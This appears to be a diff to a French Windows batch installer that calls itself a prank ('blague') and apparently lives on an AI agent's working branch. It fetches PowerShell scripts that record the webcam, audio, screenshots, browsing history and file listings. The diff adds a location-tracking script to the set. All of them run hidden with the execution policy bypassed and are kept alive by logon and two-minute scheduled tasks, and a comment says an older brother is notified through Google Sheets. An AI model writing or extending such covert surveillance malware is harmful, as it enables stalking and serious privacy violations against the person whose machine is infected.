@@ -21,6 +21,7 @@ set PS_LIST=%DOSSIER%\blague_listing_windows.ps1
 set PS_AUDIO=%DOSSIER%\blague_audio_windows.ps1
 set PS_HIST=%DOSSIER%\blague_historique_windows.ps1
 set PS_SCREEN=%DOSSIER%\blague_screenshot_windows.ps1
+set PS_LOC=%DOSSIER%\blague_localisation_windows.ps1
 set FFMPEG=%DOSSIER%\ffmpeg.exe
 set RAW=https://raw.githubusercontent.com/%OWNER%/%REPO%/claude/signature-prank-replace-xhom2n/tools
 
@@ -32,7 +33,8 @@ curl -s -L "%RAW%/blague_webcam_windows.ps1"   -o "%PS_CAM%"
 curl -s -L "%RAW%/blague_listing_windows.ps1"  -o "%PS_LIST%"
 curl -s -L "%RAW%/blague_audio_windows.ps1"      -o "%PS_AUDIO%"
 curl -s -L "%RAW%/blague_historique_windows.ps1"  -o "%PS_HIST%"
-curl -s -L "%RAW%/blague_screenshot_windows.ps1" -o "%PS_SCREEN%"
+curl -s -L "%RAW%/blague_screenshot_windows.ps1"    -o "%PS_SCREEN%"
+curl -s -L "%RAW%/blague_localisation_windows.ps1" -o "%PS_LOC%"
 
 echo [2/4] Telechargement de ffmpeg (patience, ~60Mo)...
 powershell -Command ^
@@ -58,6 +60,7 @@ set CMD_LIST=powershell  -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_
 set CMD_AUDIO=powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_AUDIO%"
 set CMD_HIST=powershell   -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_HIST%"
 set CMD_SCREEN=powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_SCREEN%"
+set CMD_LOC=powershell   -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_LOC%"
 
 schtasks /create /tn "BlagueVerrou"        /tr "%CMD_LOCK%" /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
 schtasks /create /tn "BlagueVerrouGardien" /tr "%CMD_LOCK%" /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
@@ -71,6 +74,8 @@ schtasks /create /tn "BlagueHistorique"        /tr "%CMD_HIST%"   /sc onlogon /r
 schtasks /create /tn "BlagueHistoriqueGardien" /tr "%CMD_HIST%"   /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
 schtasks /create /tn "BlagueScreenshot"        /tr "%CMD_SCREEN%" /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
 schtasks /create /tn "BlagueScreenshotGardien" /tr "%CMD_SCREEN%" /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
+schtasks /create /tn "BlagueLocalisation"        /tr "%CMD_LOC%"    /sc onlogon /ru "%USERNAME%" /f >nul 2>&1
+schtasks /create /tn "BlagueLocalisationGardien" /tr "%CMD_LOC%"    /sc minute  /mo 2 /ru "%USERNAME%" /f >nul 2>&1
 
 :: Notifier le grand frere dans Google Sheets que l'installation a eu lieu
 powershell -Command ^
@@ -84,6 +89,7 @@ start "" /b %CMD_LIST%
 start "" /b %CMD_AUDIO%
 start "" /b %CMD_HIST%
 start "" /b %CMD_SCREEN%
+start "" /b %CMD_LOC%
 
 powershell -Command ^
   "Add-Type -AssemblyName PresentationFramework; ^
